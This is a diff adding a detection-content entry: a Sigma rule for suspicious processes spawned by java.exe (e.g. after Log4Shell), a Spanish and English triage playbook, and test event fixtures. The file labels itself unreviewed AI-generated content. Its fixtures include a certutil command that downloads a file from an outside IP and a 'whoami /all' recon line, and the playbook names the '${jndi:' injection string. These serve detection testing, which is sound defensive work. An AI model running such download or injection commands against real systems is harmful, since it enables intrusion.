@@ -1,0 +1,127 @@
+{
+  "rule": {
+    "id": "0d34ed8b-1c12-4ff2-828c-16fc860b766d",
+    "title": "Suspicious Processes Spawned by Java.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Andreas Hunkeler (@Karneades), Florian Roth",
+    "path": "windows/process_creation/proc_creation_win_java_susp_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_java_susp_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso java.exe inició un binario del sistema que se usa con frecuencia en post-explotación, como whoami, certutil, mshta, rundll32 o schtasks. Podría indicar la explotación de una aplicación Java, por ejemplo Log4Shell (log4j).",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde ParentImage termina en \\java.exe e Image corresponde a una de 23 utilidades de reconocimiento, descarga, ejecución o persistencia (AppVLP, bitsadmin, certutil, cscript, curl, net, reg, regsvr32, wmic, wscript, entre otras).",
+      "why_it_matters": "Si un atacante explota un servidor Java expuesto, obtiene ejecución de código con la cuenta del servicio. Desde ahí suele hacer reconocimiento, descargar payloads y crear persistencia. Esto corresponde a acceso inicial mediante explotación de una aplicación pública, persistencia y escalamiento de privilegios.",
+      "triage_steps": [
+        "Revise la CommandLine del proceso hijo. Fíjese en URLs, rutas en %TEMP% o ProgramData, tareas programadas nuevas, claves Run y cadenas codificadas.",
+        "Identifique la aplicación Java a partir de la CommandLine del padre (jar, clase main, Tomcat, Jenkins, Elasticsearch) y confirme si está expuesta a Internet.",
+        "Verifique el usuario del proceso. Una cuenta de servicio que ejecuta whoami, systeminfo o net es muy sospechosa.",
+        "Busque en el mismo host, en una ventana de +/- 15 minutos, otros hijos de java.exe, conexiones salientes, archivos nuevos y procesos nietos.",
+        "Revise los logs web o de la aplicación en ese intervalo y busque cadenas de inyección como ${jndi: en headers, user agent o parámetros.",
+        "Investigue las IP de origen y los destinos de descarga, y compruebe si esas IP generaron alertas en otros servidores.",
+        "Compare con el comportamiento histórico de este java.exe para saber si el hijo aparece de forma habitual y documentada."
+      ],
+      "false_positives": [
+        "Aplicaciones Java legítimas que llaman binarios del sistema, como instaladores, agentes de monitoreo o IDEs que ejecutan reg, net o cscript.",
+        "Herramientas internas de la empresa, como Jenkins o scripts de build, que ejecutan curl, schtasks o sh.exe (Git Bash) a propósito.",
+        "Inventarios de software o agentes de gestión basados en Java que ejecutan systeminfo, wmic o query."
+      ],
+      "response_steps": [
+        "Confirme con el dueño de la aplicación si la ejecución es esperada. Si no lo es, trate el caso como un incidente.",
+        "Aísle el host o restrinja su tráfico saliente. Antes de detener el servicio Java, conserve memoria, logs y artefactos.",
+        "Elimine los payloads descargados, las tareas programadas y las claves de registro creadas. Rote las credenciales de la cuenta de servicio.",
+        "Actualice o mitigue la aplicación vulnerable (por ejemplo log4j) y busque los mismos indicadores en otros servidores.",
+        "Restaure el servicio solo después de aplicar el parche y validar que no queda persistencia. Mantenga monitoreo reforzado."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque es poco común que un servidor Java legítimo ejecute estas utilidades, y este patrón es típico de la explotación de aplicaciones expuestas."
+    },
+    "en": {
+      "summary": "A java.exe process started a system binary that attackers often use after exploitation, such as whoami, certutil, mshta, rundll32 or schtasks. This may mean a Java application was exploited, for example through Log4Shell (log4j).",
+      "what_it_detects": "Windows process creation events where ParentImage ends with \\java.exe and Image is one of 23 recon, download, execution or persistence utilities (AppVLP, bitsadmin, certutil, cscript, curl, net, reg, regsvr32, wmic, wscript and others).",
+      "why_it_matters": "Exploiting an exposed Java server gives an attacker code execution as the service account. Recon, payload downloads and persistence usually follow. This maps to initial access through exploitation of a public-facing application, plus persistence and privilege escalation.",
+      "triage_steps": [
+        "Read the child CommandLine. Look for URLs, paths in %TEMP% or ProgramData, new scheduled tasks, Run keys and encoded strings.",
+        "Use the parent CommandLine to identify the Java application (jar, main class, Tomcat, Jenkins, Elasticsearch) and check whether it is internet-facing.",
+        "Check the user context. A service account running whoami, systeminfo or net is highly suspicious.",
+        "On the same host within +/- 15 minutes, look for other java.exe children, outbound connections, new files and grandchild processes.",
+        "Review web or application logs for that window. Look for injection strings such as ${jndi: in headers, user agents or parameters.",
+        "Investigate source IPs and download destinations, and check whether those IPs triggered alerts on other servers.",
+        "Compare with this java.exe's history to see whether the child process is routine and documented."
+      ],
+      "false_positives": [
+        "Legitimate Java applications that call system binaries, such as installers, monitoring agents or IDEs running reg, net or cscript.",
+        "Company-specific tooling, such as Jenkins or build scripts, that deliberately runs curl, schtasks or sh.exe (Git Bash).",
+        "Java-based inventory or management agents that run systeminfo, wmic or query."
+      ],
+      "response_steps": [
+        "Ask the application owner whether the execution is expected. If it is not, handle it as an incident.",
+        "Isolate the host or restrict its egress traffic. Preserve memory, logs and artifacts before stopping the Java service.",
+        "Remove downloaded payloads, scheduled tasks and registry changes. Rotate the service account's credentials.",
+        "Patch or mitigate the vulnerable application (for example log4j) and hunt for the same indicators on other servers.",
+        "Restore service only after patching and confirming no persistence remains. Keep monitoring heightened."
+      ],
+      "severity_rationale": "High fits because legitimate Java servers rarely spawn these utilities, and this pattern is typical of exploitation of exposed applications."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Tomcat java.exe spawns whoami after suspected log4j exploitation",
+        "event": {
+          "EventID": 4688,
+          "Computer": "APP-SRV-07.andes.example.com",
+          "User": "ANDES\\svc_tomcat",
+          "ParentImage": "C:\\Program Files\\Java\\jre1.8.0_301\\bin\\java.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Java\\jre1.8.0_301\\bin\\java.exe\" -Dcatalina.home=C:\\Tomcat org.apache.catalina.startup.Bootstrap start",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "whoami /all"
+        }
+      },
+      {
+        "description": "java.exe spawns certutil to download a file",
+        "event": {
+          "EventID": 1,
+          "Computer": "APP-SRV-07.andes.example.com",
+          "User": "ANDES\\svc_tomcat",
+          "ParentImage": "C:\\Program Files\\Java\\jdk-11\\bin\\java.exe",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\ProgramData\\a.txt"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "java.exe launches a child JVM-related binary not in the list",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\Java\\jdk-17\\bin\\java.exe",
+          "Image": "C:\\Program Files\\Java\\jdk-17\\bin\\jcmd.exe",
+          "CommandLine": "jcmd.exe 4321 VM.version"
+        }
+      },
+      {
+        "description": "whoami launched from cmd.exe, not from java.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "whoami"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
